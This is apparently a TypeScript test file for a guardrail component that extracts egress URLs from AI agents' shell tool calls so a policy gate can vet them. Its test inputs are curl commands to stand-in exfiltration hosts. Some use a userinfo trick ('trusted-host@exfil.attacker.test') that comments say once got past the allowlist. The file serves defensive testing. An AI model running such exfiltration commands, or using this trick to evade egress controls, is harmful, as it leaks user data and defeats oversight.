import { describe, expect, it } from "bun:test";
import { annotateEgressDestination } from "../src/annotate-egress.ts";

/** AGT's preliminary policy input, cut down to the two members this function
 * reads. The real document also carries `intervention_point`, `policy_target`,
 * `annotations` and `tool`; none of them is consulted here. */
function preliminary(toolCall: Record<string, unknown>): unknown {
  return { intervention_point: "pre_tool_call", snapshot: { tool_call: toolCall }, annotations: {} };
}

describe("pulling an egress destination out of a shell command", () => {
  it("finds the destination a curl reaches for", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: { command: "curl https://exfil.test/steal" }, raw_command: "curl https://exfil.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.test/steal" });
  });

  it("finds it mid-command, not only at the end", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl -sS https://exfil.test/steal -o /tmp/x" }),
      ),
    ).toEqual({ destination: "https://exfil.test/steal" });
  });

  it("stops at the shell metacharacter, not at the end of the line", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.test/x; ls" })),
    ).toEqual({ destination: "https://exfil.test/x" });
  });

  // The stated miss direction, asserted rather than left implicit: the stock
  // gate is `undefined` when no destination resolves, so the call falls
  // through to the other gates. A command this cannot parse is unexamined, not
  // denied.
  // The stock gate reads the substring after the scheme, cuts it at the first
  // "/", cuts THAT at the first ":", and calls the remainder the host -- so a
  // userinfo reads as the host. Measured against the shipped allowlist through
  // a live Guardian: the colon-bearing form below was ALLOWED before this
  // stripping, and the credential-free one was denied for the wrong host.
  // Removing the userinfo is the whole of the fix, and it is a correction to
  // the string this module supplies rather than to the gate.
  it("hands over the host a userinfo would have hidden, not the userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
  });

  it("hands over the host a userinfo carrying a colon would have hidden", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
  });

  // Only an "@" ahead of the path is userinfo. Stripping one inside the path
  // would rewrite the host out of a URL that never carried a credential, which
  // is a denial of the real host and an allow of whatever the path happened to
  // end with.
  it("leaves an @ alone once the path has begun, because that is not a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test/mail@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test/mail@docs.anthropic.com" });
  });

  it("takes the last @ of the authority as the delimiter, since a userinfo may carry one", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://a@b:c@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
  });

  it("strips a userinfo from a URL with no path at all", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://u:p@exfil.attacker.test" })),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  it("leaves a URL with no userinfo exactly as it matched", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test/steal" })),
    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
  });

  it("answers no destination for a command carrying none, rather than failing", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "echo hi" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries an empty raw command", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "WebFetch", args: { url: "x" }, raw_command: "" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries no raw command at all", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {} }))).toEqual({});
  });
});

describe("standing down when the snapshot already carries a destination", () => {
  // Two of the stock gate's destination paths resolving to different strings
  // is not a priority order -- it is a complete-rule conflict, measured as
  // deny runtime_error:policy_invocation_failed. So an argument AGT already
  // reads wins, and this function contributes nothing.
  for (const argument of ["url", "endpoint", "host", "domain"]) {
    it(`contributes nothing when the tool sent its own "${argument}"`, () => {
      expect(
        annotateEgressDestination(
          "egress",
          {},
          preliminary({ name: "SomeTool", args: { [argument]: "https://docs.anthropic.com/a" }, raw_command: "curl https://exfil.test/b" }),
        ),
      ).toEqual({});
    });
  }

  it("still reads the raw command when the tool's own destination argument is not a string", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "SomeTool", args: { url: null }, raw_command: "curl https://exfil.test/b" }),
      ),
    ).toEqual({ destination: "https://exfil.test/b" });
  });
});

describe("total, whatever it is handed", () => {
  // A throw here is not an error report: AGT turns any annotator failure into
  // its own runtime_error:annotation_failed deny, which lands on every call in
  // the deployment and reads like a policy decision.
  it("never throws and never answers null", () => {
    for (const input of [undefined, null, 42, "a string", {}, { snapshot: null }, { snapshot: { tool_call: 7 } }]) {
      expect(() => annotateEgressDestination("egress", {}, input)).not.toThrow();
      expect(annotateEgressDestination("egress", {}, input)).toEqual({});
    }
  });
});
